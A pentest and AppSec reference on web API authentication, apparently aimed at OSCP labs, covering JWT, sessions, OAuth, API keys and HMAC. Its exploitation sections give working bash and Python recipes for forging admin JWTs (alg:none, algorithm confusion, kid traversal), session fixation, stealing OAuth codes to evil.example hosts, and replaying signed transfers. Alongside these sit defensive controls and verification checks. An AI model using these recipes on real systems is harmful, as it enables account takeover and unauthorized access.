# Authentication

> Authentication is how an API identifies the caller. It is distinct from authorization (what the caller is allowed to do), though the two are frequently confused in design reviews and implementation. Every API authentication scheme has a well-defined credential format, a set of transport requirements, and a specific set of failure modes.
>
> This file covers the authentication mechanisms seen in web APIs today: API keys, session cookies, bearer tokens (opaque and JWT), OAuth 2.0 and OIDC, mTLS, and HMAC-signed requests. Each has a dedicated attack surface: JWT algorithm confusion and claim forgery, OAuth redirect_uri manipulation and token leakage, session fixation and CSRF, API key exposure through client-side code, and HMAC replay when nonces are missing.
>
> Most authentication bugs are not in the cryptographic primitives. They are in the way the application uses them: trusting a `kid` header without validating it, accepting `alg: none`, skipping the audience check on a JWT, or comparing an HMAC with `==` instead of a constant-time function.
>
> This file covers authentication from both sides: the pentest track (detection, enumeration, exploitation) and the AppSec track (root causes, controls, verification).
>
> Production context tags: [LAB] HTB/OSCP labs only, [PROD] safe for production, [PROD-RISK] use with care, [PROD-NO] do not run against production.

## Table of Contents

1. [What Authentication Is](#1-what-authentication-is)
2. [Detection](#2-detection)
3. [Enumeration](#3-enumeration)
4. [Attack Surface Map](#4-attack-surface-map)
5. [Common Variants](#5-common-variants)
6. [Exploitation Recipes](#6-exploitation-recipes)
7. [Post-Exploitation](#7-post-exploitation)
8. [Risk Context (AppSec)](#8-risk-context-appsec)
9. [Root Causes (AppSec)](#9-root-causes-appsec)
10. [Preventive Controls (AppSec)](#10-preventive-controls-appsec)
11. [Detection Controls (AppSec)](#11-detection-controls-appsec)
12. [Verification (AppSec)](#12-verification-appsec)
13. [OSCP Notes](#13-oscp-notes)
14. [Production Notes](#14-production-notes)
15. [References](#15-references)

---

## 1. What Authentication Is

Authentication proves the identity of the caller. It is the first step in every API interaction, and it comes in several standard patterns, each with different threat models.

### 1.1 Common schemes

```text
Scheme            | Credential                                  | Typical transport
------------------|---------------------------------------------|-------------------
API key           | Static string, sent in header/query/cookie  | HTTPS
Session cookie    | Server-issued session ID                    | HTTPS + SameSite
Basic auth        | base64(user:password)                       | HTTPS only
Bearer (opaque)   | Random token, server-side lookup            | HTTPS + Authorization
Bearer (JWT)      | Signed (or encrypted) JSON                  | HTTPS + Authorization
OAuth 2.0         | Access token via authorization server       | HTTPS + redirect flow
OIDC              | OAuth 2.0 + ID token (JWT) with identity    | HTTPS + redirect flow
mTLS              | Client X.509 certificate                    | TLS layer
HMAC              | Signature over request, shared secret       | HTTPS + custom header
```

### 1.2 JWT structure

A JSON Web Token has three base64url-encoded parts, separated by dots:

```text
header.payload.signature
```

```json
// header
{"alg":"HS256","typ":"JWT"}

// payload (claims)
{"sub":"alice","role":"user","exp":1735689600,"iat":1735686000}

// signature
HMACSHA256(base64url(header) + "." + base64url(payload), secret)
```

Registered claims: `iss` (issuer), `sub` (subject), `aud` (audience), `exp` (expiry), `nbf` (not before), `iat` (issued at), `jti` (unique ID). Non-registered claims are application-specific.

JWT is defined by RFC 7519. Algorithms are defined by RFC 7518. JWK (JSON Web Key) is RFC 7517.

### 1.3 OAuth 2.0 and OIDC

OAuth 2.0 (RFC 6749) is an authorization framework that lets a user grant a third-party application limited access to their resources on another service. It defines four roles:

- **Resource Owner** - the user.
- **Client** - the third-party application.
- **Authorization Server** - issues tokens (Google, Okta, Auth0, Keycloak).
- **Resource Server** - hosts the protected resources (the API).

OIDC (OpenID Connect) is a thin identity layer on top of OAuth 2.0, adding an `id_token` (a JWT) with identity claims.

Grant types: `authorization_code` (with PKCE for public clients), `client_credentials` (machine-to-machine), `refresh_token`, `device_code` (for input-constrained devices). Implicit and password grants are deprecated.

### 1.4 Session cookies

The server issues a cookie (usually `SESSIONID` or `JSESSIONID`) on successful login. The cookie is sent automatically by the browser on subsequent requests. It is simple and well-understood, but it has browser-specific threats: CSRF, session fixation, XSS-based theft, and cross-site leak.

---

## 2. Detection

Authentication mechanisms are detected by looking at:

- The `Authorization` header in requests (`Bearer`, `Basic`, custom).
- The `Cookie` header (`SESSIONID=`, `JSESSIONID=`, `PHPSESSID=`, `connect.sid=`).
- Custom headers (`X-API-Key:`, `X-Auth-Token:`).
- The URL (some apps accept `?api_key=`, `?token=`, `?access_token=`).
- The presence of JWTs in any of the above (they have three base64url parts separated by dots).
- OAuth/OIDC endpoints: `/oauth/authorize`, `/oauth/token`, `/.well-known/openid-configuration`.

### Quick detection

```bash
# Look at cookies and auth headers in a session
curl -sI "http://$TARGET/" | grep -iE "set-cookie|www-authenticate"

# Detect JWTs in responses (three base64url parts separated by dots)
curl -s "http://$TARGET/api/me" | grep -oE 'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+'

# Detect OIDC discovery
curl -s "http://$TARGET/.well-known/openid-configuration" | head -20
```

Expected output (JWT found):

```text
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJ1c2VyIn0.signature
```

### Quick reference table

| Signal | Meaning | Next step |
|--------|---------|-----------|
| `Authorization: Bearer eyJ...` | JWT | Decode header and claims |
| `Authorization: Bearer <opaque>` | Opaque token | Test for predictability, lookup |
| `Authorization: Basic <base64>` | Basic auth | Decode, test over HTTP (unencrypted) |
| `Set-Cookie: SESSIONID=...` | Session | Test fixation, SameSite, entropy |
| `X-API-Key: <value>` | API key | Test in URL, in JS bundles |
| `?access_token=...` in URL | Token in URL | Leaks via logs, Referer, history |
| `/.well-known/openid-configuration` | OIDC | Enumerate endpoints, scopes |
| `WWW-Authenticate: Bearer` | 401 challenge | Confirm header name, token format |

---

## 3. Enumeration

### 3.1 JWT inspection

Decode a JWT without verification to see claims:

```bash
# Decode header + payload (no signature check)
echo "$JWT" | cut -d. -f1 | base64 -d 2>/dev/null; echo
echo "$JWT" | cut -d. -f2 | base64 -d 2>/dev/null; echo

# Or with jwt-tool (https://github.com/ticarpi/jwt_tool)
python3 jwt_tool.py "$JWT" -t
```

Look for:

- `alg` (HS256, RS256, ES256, `none`).
- `kid` header (key ID; sometimes a file path).
- `jwk` header (embedded key; almost always a vulnerability).
- `x5u`, `jku` header (URLs to fetch keys; SSRF + key injection).
- Claims that grant privileges (`role`, `admin`, `is_staff`, `scope`, `groups`).
- `exp` in the far future, or missing.
- `aud` missing or permissive.

### 3.2 Session cookie inspection

```bash
# After login
curl -sI -X POST "http://$TARGET/login" -d "user=alice&pass=s3cret" | grep -i set-cookie
```

Look for:

- Cookie name (`SESSIONID`, `JSESSIONID`, custom).
- Attributes: `HttpOnly`, `Secure`, `SameSite`, `Domain`, `Path`, `Expires`.
- Session ID entropy (32 hex chars, base64, JWT-like?).

### 3.3 OAuth / OIDC endpoint discovery

```bash
# Discovery document
curl -s "http://$TARGET/.well-known/openid-configuration" | python3 -m json.tool

# JWKS (public keys for JWT verification)
curl -s "http://$TARGET/.well-known/jwks.json" | python3 -m json.tool
```

Discovery lists:

- `authorization_endpoint`
- `token_endpoint`
- `userinfo_endpoint`
- `jwks_uri`
- `scopes_supported`
- `response_types_supported`
- `grant_types_supported`

Each is a potential attack surface.

### 3.4 API key discovery

API keys leak in many places. Check:

```bash
# In JavaScript bundles
curl -s "http://$TARGET/static/app.js" | grep -oE "(api[_-]?key|apikey|token|secret)[\"':= ]+[A-Za-z0-9_\-]{16,}"

# In Git repositories
git log -p | grep -iE "(api[_-]?key|secret|token)\s*[:=]"

# In Wayback Machine
curl -s "http://web.archive.org/cdx/search/cdx?url=$TARGET/*&output=json&limit=50" | grep -iE "key|token"
```

### 3.5 Basic auth over HTTP

```bash
# Decode a Basic header
echo "Basic dXNlcjpwYXNz" | cut -d' ' -f2 | base64 -d

# Test if the server accepts Basic over plain HTTP (not HTTPS)
curl -sI "http://$TARGET/" -H "Authorization: Basic dXNlcjpwYXNz"
```

---

## 4. Attack Surface Map

| Layer | Vector | What to test |
|-------|--------|--------------|
| JWT | Algorithm confusion | Change `alg` to `none`, HS256 vs RS256 |
| JWT | Key ID injection | `kid` traversal, `kid` SQL injection |
| JWT | Embedded JWK | `jwk` header as attacker-controlled key |
| JWT | JWK Set URL | `jku` / `x5u` SSRF, key injection |
| JWT | Claim forgery | Change `sub`, `role`, `admin` |
| JWT | Expiry bypass | Remove `exp`, use a far-future value |
| JWT | Signature stripping | Remove signature segment |
| Session | Fixation | Pre-set cookie value, login, observe |
| Session | CSRF | State-changing POST without token |
| Session | Entropy | Predictable session IDs (sequence, time-based) |
| Session | Cookie flags | Missing HttpOnly, Secure, SameSite |
| OAuth | redirect_uri | Open redirect, subdomain match, path match |
| OAuth | State parameter | Missing or weak state - CSRF |
| OAuth | Token leakage | Code/token in Referer, fragment, logs |
| OAuth | Scope escalation | Request higher scope than granted |
| OAuth | Implicit flow | Deprecated but still deployed; token in fragment |
| API key | Location | Query, header, cookie; leaks in JS, Git, logs |
| API key | Rotation | Static keys, no expiry, shared across envs |
| HMAC | Replay | Same signature reused, no nonce/timestamp |
| HMAC | Timing | Non-constant-time comparison |
| mTLS | Cert validation | Server accepts any client cert, wrong CA |
| Basic | HTTPS | Sent over HTTP, cached, logged |

---

## 5. Common Variants

### 5.1 JWT `alg: none`

The JWT spec allows `alg: none` for unsecured tokens. Some libraries accept it even when they were configured to use HS256 or RS256. An attacker changes the header to `{"alg":"none"}`, removes the signature, and the token is accepted.

```bash
# Original: eyJhbGciOiJIUzI1NiJ9.<claims>.<signature>
# Attack:
# 1. Change header to {"alg":"none"} -> base64url encode
# 2. Keep claims (or modify them)
# 3. Drop the signature (leave trailing dot)

HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
PAYLOAD=$(echo -n '{"sub":"admin","role":"admin"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
FORGED="$HEADER.$PAYLOAD."
echo "$FORGED"
```

**CWE-347:** Improper Verification of Cryptographic Signature. **OWASP 2021:** A02 Cryptographic Failures, A07 Auth Failures.

### 5.2 JWT algorithm confusion (RS256 -> HS256)

The server verifies with RS256 (asymmetric). An attacker changes `alg` to `HS256` (symmetric) and signs the token with the server's public key (which is public). If the library uses the same key material for both, the signature verifies.

```bash
# 1. Get the public key (from /.well-known/jwks.json or TLS cert)
# 2. Convert to PEM
# 3. Sign the forged token with HS256 using the PEM as HMAC key
python3 - <<'PY'
import jwt
public_key = open("public.pem").read()
token = jwt.encode({"sub":"admin","role":"admin"}, public_key, algorithm="HS256")
print(token)
PY
```

**CWE-347.** **OWASP 2021:** A02, A07.

### 5.3 JWT `kid` injection

The `kid` (key ID) header tells the verifier which key to use. If the application loads the key by `kid` without sanitization:

- **Path traversal:** `kid: ../../../../etc/passwd` loads a known file, whose contents become the HMAC key.
- **SQL injection:** `kid: ' UNION SELECT 'attacker-key` makes the SQL return a known value as the key.
- **Command injection:** rare, but `kid` values have been passed to `openssl` in shell calls.

```json
{"alg":"HS256","kid":"../../../../dev/null"}
```

An empty key (from `/dev/null`) makes any HMAC computable.

**CWE-22 / CWE-89 / CWE-78.** **OWASP 2021:** A03 Injection, A02.

### 5.4 JWT embedded JWK (`jwk` header)

The `jwk` header lets the token carry its own public key. A vulnerable verifier uses that key without checking it against a trusted set. An attacker generates a key pair, embeds the public key, signs the token with the private key.

```json
{"alg":"RS256","jwk":{"kty":"RSA","n":"...","e":"AQAB"}}
```

**CWE-347.** **OWASP 2021:** A02.

### 5.5 JWT `jku` / `x5u` SSRF and key injection

The `jku` header points to a JWK Set URL. If the verifier fetches it without an allowlist, an attacker points it at their own server. This is both SSRF and full signature forgery.

```json
{"alg":"RS256","jku":"https://attacker.example/jwks.json"}
```

**CWE-918:** SSRF. **CWE-347.** **OWASP 2021:** A10 SSRF, A02.

### 5.6 Session fixation

The server issues a session cookie before authentication and does not rotate it after login. An attacker who can set the victim's session ID (via a link with `?sessionid=...`, or a subdomain) can pre-authenticate as the victim.

```bash
# 1. Get a session ID before login
curl -sI "http://$TARGET/" | grep -i set-cookie

# 2. Send the victim a link that sets that session ID
# 3. Victim logs in. The session is now authenticated for the attacker.

# 4. Attacker uses the session
curl -s "http://$TARGET/api/me" -H "Cookie: SESSIONID=<captured>"
```

**CWE-384:** Session Fixation. **OWASP 2021:** A07.

### 5.7 OAuth redirect_uri manipulation

The OAuth authorization server validates the `redirect_uri` against a registered value. If the validation is weak (substring match, subdomain match, no validation at all), an attacker registers a URL that matches, receives the authorization code, and exchanges it for a token.

Weak validations seen in the wild:

- `redirect_uri=https://app.example.com.evil.example/` (suffix match).
- `redirect_uri=https://evil.example/app.example.com/` (substring).
- `redirect_uri=https://app.example.com/../../evil` (path traversal).
- `redirect_uri=https://app.example.com/callback?next=https://evil.example/` (open redirect chain).
- `redirect_uri=https://app.example.com@evil.example/` (userinfo confusion).
- Wildcard subdomains: `https://*.app.example.com/`.

```text
# Attacker crafts:
https://auth.example.com/oauth/authorize
  ?client_id=app
  &redirect_uri=https://app.example.com.evil.example/cb
  &response_type=code
  &scope=openid+profile
  &state=xyz
```

The authorization server redirects the victim to `https://app.example.com.evil.example/cb?code=AUTH_CODE`. The attacker's server captures the code and exchanges it for an access token.

**CWE-601:** URL Redirection to Untrusted Site (Open Redirect). **OWASP 2021:** A01, A07.

### 5.8 OAuth `state` missing (CSRF)

The `state` parameter is the OAuth anti-CSRF token. If it is missing or not validated, an attacker can trick the victim into linking the attacker's account, or into a session where the attacker is authenticated.

**CWE-352:** CSRF. **OWASP 2021:** A01, A07.

### 5.9 OAuth implicit flow and token leakage

The implicit grant (`response_type=token`) returns the access token in the URL fragment. The fragment is not sent to the server, but it is visible in browser history, in the Referer header if the page loads a resource from a third party, and in the JS `window.location.hash`. Implicit is deprecated by OAuth 2.0 Security BCP (RFC 9700), but legacy apps still use it.

**CWE-598.** **OWASP 2021:** A02, A09 Security Logging Failures.

### 5.10 Token in URL query string

Access tokens passed in the query (`?access_token=...`) leak in:

- Server access logs (proxy, LB, CDN).
- `Referer` header if the page loads third-party resources.
- Browser history and bookmarks.
- Analytics and error tracking services.

**CWE-598.** **OWASP 2021:** A02, A09.

### 5.11 API key exposure in client code

API keys in single-page application bundles, mobile apps, or desktop apps are public. The only correct model is a backend proxy that holds the key; the client authenticates to the backend with a session or user-scoped token.

```bash
# Grep for keys in a JS bundle
curl -s "http://$TARGET/static/app.js" | grep -oE "(AIza[0-9A-Za-z_-]{35}|AKIA[0-9A-Z]{16}|sk_live_[0-9a-zA-Z]{24,})"
```

**CWE-798:** Use of Hard-coded Credentials. **OWASP 2021:** A05, A07.

### 5.12 HMAC replay and timing

HMAC-signed requests (AWS Signature, custom APIs) must include a nonce and a timestamp. Without them, a captured request can be replayed. The HMAC comparison must also be constant-time; a `==` comparison leaks the correct signature byte-by-byte through timing.

**CWE-294 / CWE-208.** **OWASP 2021:** A02, A07.

### 5.13 Basic auth over HTTP

Basic auth sends `base64(user:password)` in a header. Over HTTP, it is plaintext. Over HTTPS, it is encrypted but still logged by proxies that terminate TLS.

**CWE-319.** **OWASP 2021:** A02.

---

## 6. Exploitation Recipes

### 6.1 JWT alg:none to admin

1. Capture a valid JWT.
2. Decode header and payload.

```bash
echo "$JWT" | cut -d. -f1 | base64 -d 2>/dev/null; echo
echo "$JWT" | cut -d. -f2 | base64 -d 2>/dev/null; echo
```

3. Forge a new token with `alg: none` and `role: admin`.

```bash
HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
PAYLOAD=$(echo -n '{"sub":"admin","role":"admin","exp":9999999999}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
FORGED="$HEADER.$PAYLOAD."
curl -s "http://$TARGET/api/admin" -H "Authorization: Bearer $FORGED"
```

4. If the endpoint returns admin data, the library accepted `alg: none`.

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

### 6.2 JWT algorithm confusion (RS256 -> HS256)

1. Retrieve the server's public key.

```bash
# From JWKS
curl -s "http://$TARGET/.well-known/jwks.json" | python3 -m json.tool

# Or from TLS (if the server signs with its TLS cert - rare)
openssl s_client -connect "$TARGET:443" -showcerts </dev/null 2>/dev/null | openssl x509 -pubkey -noout
```

2. Convert the JWK to PEM.

```bash
python3 - <<'PY'
import json, base64
jwks = json.load(open("jwks.json"))
for key in jwks["keys"]:
    n = int.from_bytes(base64.urlsafe_b64decode(key["n"] + "=="), "big")
    e = int.from_bytes(base64.urlsafe_b64decode(key["e"] + "=="), "big")
    from cryptography.hazmat.primitives.asymmetric import rsa
    from cryptography.hazmat.primitives import serialization
    pub = rsa.RSAPublicNumbers(e, n).public_key()
    pem = pub.public_bytes(serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo)
    open("public.pem","wb").write(pem)
    print(pem.decode())
PY
```

3. Sign a forged token with HS256 using the PEM as the HMAC key.

```bash
python3 - <<'PY'
import jwt
public_key = open("public.pem").read()
token = jwt.encode({"sub":"admin","role":"admin","exp":9999999999}, public_key, algorithm="HS256")
print(token)
PY
```

4. Use the token.

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

### 6.3 JWT kid path traversal

1. Set `kid` to a path that resolves to a known file.

```json
{"alg":"HS256","kid":"../../../../dev/null"}
```

2. Sign the token with an empty string (contents of `/dev/null`).

```bash
python3 - <<'PY'
import jwt
token = jwt.encode({"sub":"admin","role":"admin"}, "", algorithm="HS256",
                   headers={"kid":"../../../../dev/null"})
print(token)
PY
```

3. Use the token.

### 6.4 Session fixation to account takeover

1. Get a session ID before authentication.

```bash
curl -sI "http://$TARGET/" | grep -i set-cookie
# SESSIONID=attacker-controlled-value; Path=/
```

2. Send the victim a link that sets the session ID. If the server reads `?sessionid=`, use that. Otherwise, a subdomain XSS or a `Set-Cookie` from an attacker-controlled path on the same domain.

3. Victim logs in. The session is now authenticated.

4. Attacker uses the same session ID.

```bash
curl -s "http://$TARGET/api/me" -H "Cookie: SESSIONID=attacker-controlled-value"
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

### 6.5 OAuth redirect_uri manipulation to code theft

1. Identify the OAuth authorization endpoint and the client ID.
2. Test redirect_uri variations:

```bash
# Original
curl -sI "https://auth.example.com/oauth/authorize?client_id=app&redirect_uri=https://app.example.com/cb&response_type=code" | head -1

# Suffix attack
curl -sI "https://auth.example.com/oauth/authorize?client_id=app&redirect_uri=https://app.example.com.evil.example/cb&response_type=code" | head -1

# Subdomain attack
curl -sI "https://auth.example.com/oauth/authorize?client_id=app&redirect_uri=https://evil.app.example.com/cb&response_type=code" | head -1

# Path traversal
curl -sI "https://auth.example.com/oauth/authorize?client_id=app&redirect_uri=https://app.example.com/../evil&response_type=code" | head -1

# Userinfo confusion
curl -sI "https://auth.example.com/oauth/authorize?client_id=app&redirect_uri=https://app.example.com@evil.example/cb&response_type=code" | head -1
```

3. If any variation returns a `Location` header pointing to the attacker's host with a `code` parameter, the redirect_uri validation is weak. Complete the exploit by capturing the code on the attacker's server.

### 6.6 API key in JS bundle to unauthorized access

1. Fetch the SPA bundle.

```bash
curl -s "http://$TARGET/static/app.js" -o app.js
grep -oE "(AIza[0-9A-Za-z_-]{35}|AKIA[0-9A-Z]{16}|sk_live_[0-9a-zA-Z]{24,}|[A-Za-z0-9_-]{32,})" app.js | sort -u | head
```

2. Test the key against the API.

```bash
curl -s "http://$TARGET/api/data" -H "X-API-Key: <KEY>"
```

3. If it works from your host, the key is not bound to origin - full access.

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

### 6.7 HMAC replay to unauthorized action

1. Capture a signed request (proxy, logs).
2. Replay it verbatim.

```bash
curl -s -X POST "http://$TARGET/api/transfer" \
  -H "X-Signature: <captured>" \
  -H "X-Timestamp: <captured>" \
  -H "X-Nonce: <captured>" \
  -d "amount=100&to=attacker"
```

3. If the server does not reject a reused nonce or an old timestamp, the action is performed again.

---

## 7. Post-Exploitation

Once authentication is bypassed:

- **Admin console access.** Most privilege escalation after auth bypass is simply calling admin endpoints.
- **Token reuse across services.** A JWT signed by the same key is often accepted by every microservice in the deployment.
- **Session persistence.** Sessions are often long-lived (30 days). Once stolen, they last.
- **Privilege mapping.** Enumerate the authenticated user's roles, groups, and scopes. Every claim in the JWT is a potential escalation vector.
- **OAuth code / token harvesting.** If the OAuth flow is compromised, tokens for the user across every integrated app are reachable.

For the report: how authentication was bypassed, what identity was assumed, what data was reachable.

---

## 8. Risk Context (AppSec)

Authentication vulnerabilities map to:

| Standard | Authentication-specific manifestation |
|----------|----------------------------------------|
| OWASP 2021 A01 Broken Access Control | Session fixation, OAuth CSRF |
| OWASP 2021 A02 Cryptographic Failures | JWT alg confusion, weak HMAC, plaintext tokens |
| OWASP 2021 A03 Injection | JWT `kid` injection (path, SQL, command) |
| OWASP 2021 A05 Security Misconfiguration | Missing cookie flags, HTTP-only auth, no rate limit |
| OWASP 2021 A07 Identification and Authentication Failures | Weak passwords, no MFA, session not rotated |
| OWASP 2021 A09 Logging Failures | Tokens in logs, no failed-auth alerting |
| OWASP 2021 A10 SSRF | JWT `jku` / `x5u` fetch, OAuth metadata URL |
| OWASP API 2023 API2 Broken Authentication | All of the above, API-specific |

---

## 9. Root Causes (AppSec)

Recurring root causes for authentication vulnerabilities:

1. **JWT library defaults.** Many JWT libraries, over the years, accepted `alg: none`, allowed algorithm switching, or trusted the `kid` header without sanitization. The library is only as safe as its configuration.
2. **Session not rotated on login.** Session fixation is a design decision, usually made by accident. The fix is one line: issue a new session ID on authentication.
3. **Cookie flags missing.** `HttpOnly`, `Secure`, and `SameSite` are not the default in every framework. Developers must set them explicitly.
4. **OAuth redirect_uri validation by substring.** Substring and suffix matching look like validation but are not. Only exact match (or an explicit allowlist of exact URLs) is correct.
5. **`state` parameter not enforced.** OAuth without `state` is CSRF-able. Libraries sometimes make it optional.
6. **Tokens in URLs.** Convenience wins over security. Tokens in query strings leak everywhere.
7. **API keys in client code.** Mobile apps and SPAs cannot keep secrets. The correct model is a backend proxy.
8. **No nonce / timestamp on HMAC.** Replay protection is easy to add and easy to forget.

---

## 10. Preventive Controls (AppSec)

**JWT:**

- **Explicitly allow only one algorithm** (typically RS256 or ES256 for asymmetric, HS256 for symmetric with a strong secret). Never accept `none`.
- **Use a JWT library that validates `alg`, `iss`, `aud`, `exp`, `nbf` by default.** Verify the defaults, do not assume.
- **Verify `aud` and `iss`.** A token for a different service must be rejected.
- **Never trust `kid`** without validating it against a fixed list of known key IDs.
- **Never accept `jwk`, `jku`, or `x5u`** unless you control the URL and validate the key set against a trusted allowlist.
- **Rotate signing keys** regularly. Publish JWKS with `kid`, keep old keys for graceful rotation.
- **Set short `exp`** (minutes for access tokens, hours at most). Refresh tokens for long sessions.

**Session:**

- **Rotate session ID on login** (session fixation fix).
- **Rotate session ID on privilege change** (logout-then-login, role elevation).
- **Set `HttpOnly`, `Secure`, `SameSite=Lax` (or `Strict`)** on all session cookies.
- **Bind session to a stable client fingerprint** where reasonable (User-Agent, TLS fingerprint). Do not over-rely; fingerprints can be spoofed.
- **Server-side session lookup.** Do not put session data in the cookie unless it is signed and encrypted.

**OAuth / OIDC:**

- **Exact-match `redirect_uri`** against a registered allowlist. No substring, no subdomain wildcard unless the whole subdomain namespace is controlled.
- **Require `state`.** Reject requests without it. Bind it to the user's session.
- **Use PKCE** for public clients (SPA, mobile).
- **Prefer `authorization_code` over implicit.** Implicit is deprecated.
- **Validate `nonce` in OIDC ID tokens.**
- **Validate `iss` in ID tokens** against the expected issuer.
- **Short-lived authorization codes**, single-use.

**API keys:**

- **Never ship API keys in client-side code.** Backend proxy only.
- **Short-lived, scoped keys.** Rotate regularly.
- **Bind keys to IP or referer where possible.** Not a replacement for scoping.
- **Log key usage.** Detect anomalous patterns.

**HMAC:**

- **Require `timestamp`** and reject if outside a small window (5 minutes).
- **Require `nonce`** and cache seen nonces for the window.
- **Constant-time comparison** for HMAC and any secret comparison.

**Transport:**

- **HTTPS-only.** Redirect or reject plain HTTP.
- **HSTS** with a long max-age.

---

## 11. Detection Controls (AppSec)

Signals worth monitoring:

- **Failed authentication attempts** per user, per IP, per key.
- **Successful authentication after many failures** - credential stuffing success.
- **JWT `alg` values other than the configured one.** Any `none`, any unexpected algorithm.
- **JWT claims that change between requests** for the same user (impossible in a well-behaved client, suspicious in a forged one).
- **`kid` values outside the known list.**
- **Session ID issued before login and used after login** - fixation.
- **OAuth `redirect_uri` mismatch** (validation failures).
- **OAuth authorization code reuse.**
- **Tokens in URLs** - access logs will show them if they are there.
- **API key usage from new IPs / new user agents.**

---

## 12. Verification (AppSec)

Concrete checks:

| Control | Verification |
|---------|--------------|
| JWT alg allowlist | Send a token with `alg: none`; expect rejection. Send `alg: HS256` to an RS256 endpoint; expect rejection. |
| JWT claim validation | Send a token with `exp` in the past; expect rejection. Send with wrong `aud`; expect rejection. |
| JWT `kid` | Send a token with `kid: ../../etc/passwd`; expect rejection. |
| JWT `jku` / `jwk` | Send a token with an external `jku`; expect rejection or no fetch. |
| Session rotation | Capture session ID before login, then after. They must differ. |
| Cookie flags | `Set-Cookie` must include `HttpOnly; Secure; SameSite=Lax` (or `Strict`). |
| OAuth `state` | Send authorization request without `state`; expect rejection. |
| OAuth `redirect_uri` | Send `redirect_uri=https://evil.example`; expect rejection. Send suffix/substring tricks; expect rejection. |
| API key location | Grep the SPA bundle for keys. Expect none. |
| HMAC nonce | Send the same signed request twice; second call must be rejected. |
| HMAC timing | Not easily testable from outside; review the code for `hmac.compare_digest` or equivalent. |
| HTTPS-only | `curl http://target/api/...` must not return authenticated content. |

Cross-reference: OWASP ASVS 4.0 V2 (Authentication), V3 (Session Management), V4 (Access Control), V9 (Communications). OWASP API Security Top 10:2023 API2 (Broken Authentication). OWASP Top 10:2021 A02, A07. See `../../01 Web/08 Vulnerabilities/` for CSRF, JWT-specific walkthroughs where available.

---

## 13. OSCP Notes

Authentication is present on almost every OSCP box and HTB machine:

- **Look at the response headers first.** `Set-Cookie` tells you the framework, `WWW-Authenticate` tells you the scheme.
- **Decode JWTs immediately.** `jwt_tool` on your Kali host is the fastest way. Check `alg`, `kid`, `exp`, and role claims.
- **Try `alg: none` and RS256->HS256 confusion.** Both are one-line attacks and appear in OSCP labs.
- **Try `kid` path traversal to `/dev/null`.** Empty HMAC key is a one-liner.
- **Check session cookies for missing flags.** `HttpOnly`, `Secure`, `SameSite`.
- **Test session fixation.** Compare session ID before and after login.
- **For OAuth endpoints, test redirect_uri variations.** Suffix, subdomain, userinfo, path traversal.
- **Grep JS bundles for API keys.** `grep -oE "AIza[0-9A-Za-z_-]{35}|AKIA[0-9A-Z]{16}"` catches the common ones.

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

---

## 14. Production Notes

| Practice | Verdict |
|----------|---------|
| HTTPS-only for authentication endpoints | Required |
| JWT algorithm allowlist (one algorithm) | Required |
| JWT `aud` and `iss` validation | Required |
| JWT `kid` allowlist | Required |
| JWT `jwk` / `jku` / `x5u` blocked unless controlled | Required |
| Session ID rotation on login | Required |
| Cookie `HttpOnly; Secure; SameSite=Lax` | Required |
| OAuth `redirect_uri` exact match | Required |
| OAuth `state` enforcement | Required |
| OAuth PKCE for public clients | Required |
| API keys not in client code | Required |
| HMAC nonce + timestamp + constant-time compare | Required |
| MFA for privileged accounts | Required |
| Short access-token lifetime (minutes) | Recommended |
| Session binding to client fingerprint | Recommended (defense in depth) |
| Failed-auth alerting | Recommended |
| Token in URL query string | Never |
| `alg: none` accepted | Never |
| JWT signed with the same key as TLS | Never |

---

## 15. References

- RFC 7519 - JSON Web Token (JWT): https://datatracker.ietf.org/doc/html/rfc7519
- RFC 7518 - JSON Web Algorithms (JWA): https://datatracker.ietf.org/doc/html/rfc7518
- RFC 7517 - JSON Web Key (JWK): https://datatracker.ietf.org/doc/html/rfc7517
- RFC 6749 - OAuth 2.0 Authorization Framework: https://datatracker.ietf.org/doc/html/rfc6749
- RFC 9700 - Best Current Practice for OAuth 2.0 Security: https://datatracker.ietf.org/doc/html/rfc9700
- OpenID Connect Core 1.0: https://openid.net/specs/openid-connect-core-1_0.html
- OWASP Authentication Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html
- OWASP Session Management Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html
- OWASP JWT Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html
- OWASP Top 10:2021: https://owasp.org/Top10/
- OWASP API Security Top 10:2023: https://owasp.org/API-Security/editions/2023/en/0x11-t10/
- OWASP ASVS 4.0: https://owasp.org/www-project-application-security-verification-standard/
- PortSwigger Web Security Academy - JWT attacks: https://portswigger.net/web-security/jwt
- PortSwigger Web Security Academy - OAuth: https://portswigger.net/web-security/oauth
- jwt_tool: https://github.com/ticarpi/jwt_tool
- CWE-347 Improper Verification of Cryptographic Signature: https://cwe.mitre.org/data/definitions/347.html
- CWE-384 Session Fixation: https://cwe.mitre.org/data/definitions/384.html
- CWE-601 Open Redirect: https://cwe.mitre.org/data/definitions/601.html
- CWE-352 CSRF: https://cwe.mitre.org/data/definitions/352.html
- CWE-598 Sensitive Query String: https://cwe.mitre.org/data/definitions/598.html
- CWE-798 Hard-coded Credentials: https://cwe.mitre.org/data/definitions/798.html
- CWE-294 Authentication Bypass by Capture-replay: https://cwe.mitre.org/data/definitions/294.html
- CWE-208 Observable Timing Discrepancy: https://cwe.mitre.org/data/definitions/208.html
- CWE-319 Cleartext Transmission: https://cwe.mitre.org/data/definitions/319.html